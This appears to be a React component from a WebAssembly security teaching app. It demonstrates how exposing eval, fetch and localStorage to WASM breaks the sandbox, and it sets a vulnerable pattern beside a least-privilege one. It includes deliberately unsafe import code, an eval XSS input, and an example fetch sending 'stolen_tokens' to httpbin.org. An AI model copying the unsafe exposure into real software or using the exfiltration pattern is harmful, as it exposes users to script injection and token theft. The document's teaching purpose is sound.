import React, { useState, useContext } from 'react';
import { WasmErrorContext } from '../../../../App';
import * as wasm from 'wasm-security-test';
import CodeViewer from '../../../Utils/CodeViewer';
import { 
  ImplementationContainer, 
  InputField, 
  RunButton, 
  ResultDisplay, 
  SecurityMessage 
} from '../../../Shared';
import '../../../../styles/sandbox-escapes/dangerous-host-exposure.css';

// Import dangerous functions for this demonstration
import '../../../../utils/dangerousHostFunctions';

const DangerousHostExposure: React.FC = () => {
  const [exploitCode, setExploitCode] = useState('alert("XSS from WASM!")');
  const [fetchUrl, setFetchUrl] = useState('https://httpbin.org/get?wasm_data=stolen_tokens');
  const [storageKey, setStorageKey] = useState('sensitive_token');
  const [storageValue, setStorageValue] = useState('user_session_12345');
  const [results, setResults] = useState<{[key: string]: string}>({});
  const [activeDemo, setActiveDemo] = useState<string | null>(null);
  const [storageContents, setStorageContents] = useState<{[key: string]: string}>({});
  const [networkLog, setNetworkLog] = useState<string[]>([]);
  const { addError } = useContext(WasmErrorContext);

  const runEvalExploit = () => {
    try {
      setActiveDemo('eval');
      const result = wasm.unsafe_eval_access(exploitCode);
      setResults(prev => ({ ...prev, eval: result }));
    } catch (error) {
      addError(`Error: ${error}`);
    }
  };

  const runFetchExploit = () => {
    try {
      setActiveDemo('fetch');
      const result = wasm.unsafe_fetch_access(fetchUrl);
      setResults(prev => ({ ...prev, fetch: result }));
      
      // Log network activity
      const timestamp = new Date().toLocaleTimeString();
      const logEntry = `${timestamp}: WASM ‚Üí ${fetchUrl}`;
      setNetworkLog(prev => [logEntry, ...prev.slice(0, 4)]); // Keep last 5 entries
    } catch (error) {
      addError(`Error: ${error}`);
    }
  };

  const runStorageExploit = () => {
    try {
      setActiveDemo('storage');
      const result = wasm.unsafe_storage_access(storageKey, storageValue);
      setResults(prev => ({ ...prev, storage: result }));
      
      // Update storage display after a short delay to allow WASM to complete
      setTimeout(() => {
        updateStorageDisplay();
      }, 100);
    } catch (error) {
      addError(`Error: ${error}`);
    }
  };

  const runSafeVersion = () => {
    try {
      setActiveDemo('safe');
      const result = wasm.safe_restricted_access();
      setResults(prev => ({ ...prev, safe: result }));
    } catch (error) {
      addError(`Error: ${error}`);
    }
  };

  // Update storage display
  const updateStorageDisplay = () => {
    const contents: {[key: string]: string} = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        contents[key] = localStorage.getItem(key) || '';
      }
    }
    setStorageContents(contents);
  };

  // Update displays when component mounts and after operations
  React.useEffect(() => {
    updateStorageDisplay();
    // Check for existing network activity
    const existing = (window as any).networkActivity || [];
    setNetworkLog(existing);
  }, []);

  return (
    <div className="dangerous-host-exposure">
      <h3>Dangerous Host Function Exposure</h3>
      
      <div className="exploit-description">
        <p>
          <strong>WebAssembly Sandbox Escapes through Dangerous Host Function Exposure</strong>
        </p>
        <p>
          WebAssembly's security model relies entirely on the host environment (JavaScript) to 
          determine what capabilities the WASM module can access. WASM itself provides <em>no 
          built-in security boundaries</em> - it trusts the host to make safe decisions about 
          function exposure through the imports object.
        </p>
        <p>
          <strong>The Vulnerability:</strong> When developers carelessly expose powerful JavaScript 
          functions like <code>eval()</code>, <code>fetch()</code>, <code>localStorage</code>, or 
          DOM manipulation APIs to WebAssembly, they effectively break the intended sandbox. The 
          WASM module can then perform privileged operations that bypass browser security policies.
        </p>
        <p>
          <strong>Real-world Impact:</strong> This can lead to Cross-Site Scripting (XSS), data 
          exfiltration, unauthorized network requests, storage tampering, and complete compromise 
          of the web application's security model.
        </p>

        <CodeViewer 
          title="Dangerous Host Function Exposure Implementation"
          unsafeCode={`// UNSAFE: Host exposes dangerous functions to WASM
// JavaScript side - BAD PRACTICE:
const imports = {
  env: {
    js_eval: (code_ptr, code_len) => {
      const code = getString(code_ptr, code_len);
      return eval(code); // DANGEROUS: Exposes eval to WASM!
    },
    js_fetch: (url_ptr, url_len) => {
      const url = getString(url_ptr, url_len);
      fetch(url); // DANGEROUS: Unrestricted network access
    },
    js_localStorage_set: (key_ptr, key_len, val_ptr, val_len) => {
      const key = getString(key_ptr, key_len);
      const val = getString(val_ptr, val_len);
      localStorage.setItem(key, val); // DANGEROUS: Storage access
    }
  }
};

// Rust/WASM side:
#[wasm_bindgen]
extern "C" {
    #[wasm_bindgen(js_name = "js_eval")]
    fn unsafe_js_eval(code: &str) -> String;
    
    #[wasm_bindgen(js_name = "js_fetch")]
    fn unsafe_js_fetch(url: &str) -> String;
    
    #[wasm_bindgen(js_name = "js_localStorage_set")]
    fn unsafe_js_storage_set(key: &str, value: &str) -> String;
}

#[wasm_bindgen]
pub fn unsafe_eval_access(user_code: &str) -> String {
    // WASM can now execute arbitrary JavaScript!
    unsafe_js_eval(user_code)
}

#[wasm_bindgen]
pub fn unsafe_fetch_access(url: &str) -> String {
    // WASM can make arbitrary network requests!
    unsafe_js_fetch(url)
}

#[wasm_bindgen]
pub fn unsafe_storage_access(key: &str, value: &str) -> String {
    // WASM can access browser storage!
    unsafe_js_storage_set(key, value)
}`}
          safeCode={`// SAFE: Host only exposes safe, restricted functions
// JavaScript side - GOOD PRACTICE:
const imports = {
  env: {
    safe_log: (msg_ptr, msg_len) => {
      const msg = getString(msg_ptr, msg_len);
      console.log("WASM:", msg); // Safe: just logging
    },
    safe_math: (a, b) => {
      return a + b; // Safe: pure computation
    }
    // NO eval, fetch, localStorage, or other dangerous functions!
  }
};

// Rust/WASM side:
#[wasm_bindgen]
extern "C" {
    #[wasm_bindgen(js_name = "safe_log")]
    fn safe_log(message: &str);
    
    #[wasm_bindgen(js_name = "safe_math")]
    fn safe_math(a: i32, b: i32) -> i32;
}

#[wasm_bindgen]
pub fn safe_restricted_access() -> String {
    // WASM can only access safe, restricted functionality
    safe_log("This is a safe operation");
    let result = safe_math(42, 8);
    format!("Safe computation result: {}", result)
}`}
        />
      </div>

      <div className="exploit-implementations">
        <ImplementationContainer
          title="Vulnerable: Dangerous Functions Exposed"
          description="Host carelessly exposes powerful JavaScript APIs to WebAssembly, breaking the sandbox."
          type="vulnerable"
        >
          <SecurityMessage type="warning" title="Sandbox Escape Vector">
            The WebAssembly module can call any function exposed through the imports object. 
            Exposing dangerous APIs like eval(), fetch(), or storage access allows WASM to 
            escape its intended sandbox and perform privileged operations.
          </SecurityMessage>
          
          <div className="exploit-controls">
            <div className="exploit-section">
              <h5>üö® Code Execution via eval()</h5>
              <p className="exploit-detail">
                Execute arbitrary JavaScript code through WASM by exposing eval() function. 
                This completely breaks browser security and enables XSS attacks.
              </p>
              <InputField
                label="JavaScript code to execute:"
                type="text"
                value={exploitCode}
                onChange={setExploitCode}
                placeholder="alert('XSS from WASM!')"
                htmlFor="exploit-code"
              />
              <RunButton 
                type="unsafe"
                onClick={runEvalExploit}
              >
                Execute via WASM
              </RunButton>
            </div>

            <div className="exploit-section">
              <h5>üåê Network Access via fetch()</h5>
              <p className="exploit-detail">
                Make unauthorized network requests from WASM, potentially bypassing CORS 
                and exfiltrating sensitive data to attacker-controlled servers.
              </p>
              <InputField
                label="URL to fetch:"
                type="text"
                value={fetchUrl}
                onChange={setFetchUrl}
                placeholder="https://httpbin.org/get?data=stolen"
                htmlFor="fetch-url"
              />
              <RunButton 
                type="unsafe"
                onClick={runFetchExploit}
              >
                Fetch via WASM
              </RunButton>
            </div>

            <div className="exploit-section">
              <h5>üíæ Storage Access via localStorage</h5>
              <p className="exploit-detail">
                Access browser storage from WASM to steal sensitive tokens, session data, 
                or plant malicious data for persistence.
              </p>
              <InputField
                label="Key:"
                type="text"
                value={storageKey}
                onChange={setStorageKey}
                placeholder="sensitive_token"
                htmlFor="storage-key"
              />
              <InputField
                label="Value:"
                type="text"
                value={storageValue}
                onChange={setStorageValue}
                placeholder="user_session_12345"
                htmlFor="storage-value"
              />
              <RunButton 
                type="unsafe"
                onClick={runStorageExploit}
              >
                Store via WASM
              </RunButton>
            </div>
          </div>

          {/* Live displays for demonstrating effects */}
          <div className="live-displays">
            {Object.keys(storageContents).length > 0 && (
              <div className="storage-display">
                <h6>üìÇ Current Browser Storage Contents:</h6>
                <div className="storage-contents">
                  {Object.entries(storageContents).map(([key, value]) => (
                    <div key={key} className="storage-item">
                      <strong>{key}:</strong> {value}
                    </div>
                  ))}
                </div>
              </div>
            )}
            
            {networkLog.length > 0 && (
              <div className="network-display">
                <h6>üåê Recent Network Activity:</h6>
                <div className="network-log">
                  {networkLog.map((entry, index) => (
                    <div key={index} className="network-item">
                      {entry}
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>

          <SecurityMessage type="warning" title="Critical Security Vulnerability">
            <strong>Impact:</strong> Complete sandbox escape! The WASM module has gained access to 
            powerful browser APIs that should be restricted. This enables XSS attacks, data theft, 
            unauthorized network activity, and storage manipulation - effectively turning your 
            WASM module into a privileged JavaScript context.
          </SecurityMessage>
        </ImplementationContainer>

        <ImplementationContainer
          title="Secure: Restricted Function Access"
          description="Host follows principle of least privilege, only exposing safe, necessary functions."
          type="secure"
        >
          <SecurityMessage type="info" title="Secure Design Principles">
            <strong>Principle of Least Privilege:</strong> Only expose the minimum functionality 
            required for the WASM module to operate. Use capability-based security where modules 
            receive explicit permissions for specific operations.
          </SecurityMessage>
          
          <div className="exploit-controls">
            <div className="exploit-section">
              <h5>‚úÖ Safe Operations Only</h5>
              <p className="exploit-detail">
                This secure implementation only exposes safe mathematical operations and logging 
                functions. No dangerous APIs like eval(), fetch(), or storage access are available.
              </p>
              <RunButton 
                type="safe"
                onClick={runSafeVersion}
              >
                Run Safe WASM Operations
              </RunButton>
            </div>
          </div>

          <SecurityMessage type="success" title="Security Mitigation">
            <strong>Defense Strategy:</strong>
            <ul>
              <li><strong>Whitelist Approach:</strong> Only expose explicitly approved functions</li>
              <li><strong>Input Validation:</strong> Validate all data passed between host and WASM</li>
              <li><strong>Capability Control:</strong> Grant specific permissions rather than broad access</li>
              <li><strong>Audit Trail:</strong> Log all WASM-to-host function calls for monitoring</li>
              <li><strong>Sandboxing:</strong> Run WASM in isolated contexts when possible</li>
            </ul>
          </SecurityMessage>
        </ImplementationContainer>
      </div>

      {Object.keys(results).length > 0 && (
        <div className="results-panel">
          <h4>Demonstration Results</h4>
          <p className="results-explanation">
            These results show what happens when WASM modules gain access to dangerous host functions.
            In a real attack scenario, these operations would compromise the application's security.
          </p>
          
          {results.eval && (
            <div className={`result-item ${activeDemo === 'eval' ? 'active' : ''}`}>
              <strong>üö® Code Execution Attack:</strong>
              <ResultDisplay 
                result={results.eval}
                type="error"
              />
              <p className="result-explanation">
                <strong>Real Impact:</strong> An attacker could execute arbitrary JavaScript code, 
                steal user data, modify the DOM, or redirect users to malicious sites.
              </p>
            </div>
          )}
          
          {results.fetch && (
            <div className={`result-item ${activeDemo === 'fetch' ? 'active' : ''}`}>
              <strong>üåê Network Access Attack:</strong>
              <ResultDisplay 
                result={results.fetch}
                type="error"
              />
              <p className="result-explanation">
                <strong>Real Impact:</strong> Sensitive user data could be exfiltrated to 
                attacker-controlled servers, bypassing normal browser security policies.
              </p>
            </div>
          )}
          
          {results.storage && (
            <div className={`result-item ${activeDemo === 'storage' ? 'active' : ''}`}>
              <strong>üíæ Storage Access Attack:</strong>
              <ResultDisplay 
                result={results.storage}
                type="error"
              />
              <p className="result-explanation">
                <strong>Real Impact:</strong> Session tokens, authentication data, and other 
                sensitive information could be stolen or tampered with for persistent access.
              </p>
            </div>
          )}
          
          {results.safe && (
            <div className={`result-item ${activeDemo === 'safe' ? 'active' : ''}`}>
              <strong>‚úÖ Safe Operations:</strong>
              <ResultDisplay 
                result={results.safe}
                type="success"
              />
              <p className="result-explanation">
                <strong>Security Success:</strong> The WASM module can only perform safe computations 
                and logging. No dangerous capabilities are available to exploit.
              </p>
            </div>
          )}
        </div>
      )}
    </div>
  );
};

export default DangerousHostExposure;
